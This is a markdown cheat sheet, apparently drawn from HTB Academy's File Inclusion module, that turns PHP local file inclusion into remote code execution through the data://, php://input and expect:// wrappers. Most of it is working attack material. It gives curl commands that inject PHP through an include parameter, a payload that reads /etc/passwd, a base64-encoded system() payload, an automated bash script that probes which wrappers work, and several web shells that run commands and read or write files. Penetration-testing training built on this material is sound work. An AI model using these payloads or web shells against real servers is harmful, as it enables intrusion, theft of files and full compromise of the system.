## 🛰️ PHP Wrapper Techniques for RCE through LFI

### 🔍 Overview of Common Wrappers

PHP wrappers allow accessing external resources in a controlled manner. Below are some common PHP wrappers that can be used to escalate File Inclusion (LFI) vulnerabilities into Remote Code Execution (RCE).

```python
# Example: Data URL
data://text/plain,<?php echo "Hello World"; ?>

# Example: Input Stream
curl -X POST --data "<?php phpinfo(); ?>" http://target.com/lfi.php?file=php://input

# Example: Expect Wrapper
http://target.com/index.php?page=expect://echo%20"WORKING"
```

### ⚙️ How to Test PHP Wrappers for RCE

#### 🎯 Direct Configuration Check

##### Method 1: LFI with php.ini Read
```bash
curl -s "http://target.com/lfi.php?file=../../../../etc/php/*/apache2/php.ini" | grep allow_url_include
```

##### Method 2: ini_get() Function
```bash
# Verify if 'allow_url_include' is enabled
curl http://target.com/index.php?page=data://text/plain,<?php echo ini_get('allow_url_include') ? 'Enabled' : 'Disabled'; ?>
```

### 🧐 Comprehensive Wrapper Testing

#### Data Wrapper
```bash
# Basic test with data wrapper
curl "http://target.com/lfi.php?file=data://text/plain,Hello%20World"
```
[!SUCCESS] If the server responds with `Hello World`, then the data wrapper is working.

#### Input Wrapper
```bash
# Test input wrapper POST request
curl -X POST --data "<?php echo 'Input works!'; ?>" "http://target.com/lfi.php?file=php://input"
```
[!SUCCESS] If the server responds with `Input works!`, then the input wrapper is working.

#### Expect Wrapper
```bash
# Test expect wrapper
curl "http://target.com/lfi.php?file=expect://echo%20WORKING"
```
[!WARNING] The expect wrapper may require specific configurations or extensions to be enabled on the server.

#### Filter Wrapper
```bash
# Base64 encode of /etc/passwd via filter wrapper
curl "http://target.com/index.php?page=data://text/plain;base64,"$(echo -n "<?php echo file_get_contents('/etc/passwd'); ?>" | base64)
```

### 🛠️ Troubleshooting Wrapper RCE Issues

#### Data Wrapper Not Working
```bash
# Issue: allow_url_include disabled
curl "http://target.com/lfi.php?file=data://text/plain,<?php echo ini_get('allow_url_include') ? 'Enabled' : 'Disabled'; ?>"

# Solution 1: Check if allow_url_include is enabled
echo "<?php echo ini_get('allow_url_include'); ?>" | base64
data://text/plain,%3C%3Fphp%20echo%20ini_get(%27allow_url_include%27)%20%3F%20'Enabled'%20:%20'Disabled'%3B%20%3F%3E

# Solution 2: Try base64 encoded payload
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

#### Input Wrapper Issues
```bash
# Check POST method and content type
curl -v -X POST --header "Content-Type: application/x-www-form-urlencoded" --data "<?php echo 'test'; ?>" "http://target.com/lfi.php?file=php://input"
```
[!WARNING] Ensure the server is accepting POST requests correctly.

#### Expect Wrapper Not Available
```bash
# Check loaded extensions
curl -s "http://target.com/lfi.php?file=data://text/plain,<?php phpinfo(); ?>"
grep 'expect' <(curl -s "http://target.com/lfi.php?file=data://text/plain,<?php phpinfo(); ?>")
```

#### PHP Code Not Executing
```bash
# Check if include has execution privileges
echo "<?php echo 'Hello World'; ?>" | base64
data://text/plain;base64,PD9waHAgZW5jb2RlICAiSGVsbG8gV29ybGQhIjsgPz4KCg==
```

### 📚 Tools and Resources

#### RCE Testing Scripts

**Automated Wrapper Test**
```bash
#!/bin/bash
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url_with_lfi_param>"
    exit 1
fi

echo "[+] Testing PHP wrapper support..."

# Data Wrapper Check
curl "${TARGET}data://text/plain,WORKING"

# Input Wrapper Check
curl -X POST --data 'WORKING' "${TARGET}php://input"

# Expect Wrapper Check
curl "${TARGET}expect://echo WORKING"
```
[!INFO] Save the script as `test_php_wrappers.sh`, make it executable (`chmod +x test_php_wrappers.sh`), and run.

#### Payload Generation Tools

**Base64 PHP Payload Generator**
```bash
# Generate base64 encoded payload
encode_php_payload() {
    echo "$1" | base64
}
```

**URL Encoding Helper**
```bash
# URL encode PHP payloads
url_encode_payload() {
    python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))"
}
```
[!INFO] Use these scripts to generate and test various PHP RCE payloads.

#### Common PHP RCE Payloads

**Web Shell**
```php
<?php system($_GET['cmd']); ?>
```

**Enhanced Web Shell**
```php
<?php
if(isset($_GET["cmd"])) {
    echo "<pre>";
    echo shell_exec($_GET["cmd"]);
    echo "</pre>";
} else {
    echo "Usage: ?cmd=command";
}
?>
```
[!DANGER] Use these payloads carefully as they can lead to system compromise.

**File Read/Write Shell**
```php
<?php
if(isset($_GET['action'])) {
    switch($_GET["action"]) {
        case "read":
            echo file_get_contents($_GET['file']);
            break;
        case "write":
            file_put_contents($_GET['file'], $_GET['content']);
            break;
        case "exec":
            system($_GET['cmd']);
            break;
    }
}
?>
```

**Base64 Encoded Payloads**
```bash
# Basic command execution payload
echo '<?php system($_GET["cmd"]); ?>' | base64

# File read/write shell payload
echo '<?php if($_GET["a"]=="r") echo file_get_contents($_GET["f"]); if($_GET["a"]=="w") file_put_contents($_GET["f"],$_GET["c"]); ?>' | base64
```
[!WARNING] Ensure to test these payloads in a controlled environment.

---
*This guide covers PHP wrapper techniques for achieving RCE through LFI vulnerabilities, based on HTB Academy's File Inclusion module. These methods are essential for escalating LFI to full system compromise.*